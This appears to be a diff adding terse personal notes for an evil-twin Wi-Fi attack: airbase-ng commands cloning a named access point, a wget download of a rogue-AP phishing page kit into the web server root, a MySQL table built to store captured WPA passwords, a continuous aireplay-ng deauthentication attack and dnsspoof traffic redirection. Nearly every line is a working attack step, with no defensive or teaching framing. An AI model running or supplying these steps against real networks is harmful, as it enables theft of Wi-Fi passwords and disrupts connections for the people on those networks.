@@ -1,0 +1,36 @@
+airbase-ng  -a "MAC-addr"  -e "name"  -c <channel> wlan0mon
+ex:84:D8:1B:EB:24:BA  -38       49        1    0  10  270   WPA2 CCMP   PSK  long live CS 
+   84:D8:1B:EB:28:8E                      4                                  Hien                      
+ifconfig at0 10.0.0.1 up
+
+bash iptables_conf
+
+killall dnsmasq dhcpd isc-dhcp-server
+
+
+
+wget https://cdn.rootsh3ll.com/u/20180724181033/Rogue_AP.zip
+unzip rogue_AP.zip -d /var/www/html/
+
+MYSQL:
+mysql -u root -p
+create user fakeap@localhost identified by 'fakeap';
+create database rogue_AP;
+use rogue_AP;
+create table wpa_keys(password1 varchar(32), password2 varchar(32));
+grant all privileges on rogue_AP.* to 'fakeap'@'localhost';
+
+mysql -u fakeap -p
+use rogue_AP;
+insert into wpa_keys(password1, password2) values ("testpass", "testpass");
+select * from wpa_keys;
+
+------------------
+
+De-auth attack
+aireplay-ng --deauth 0 -a <MAC-addr> wlan0mon
+
+
+
+redirect http traffic :
+dnsspoof -i at0
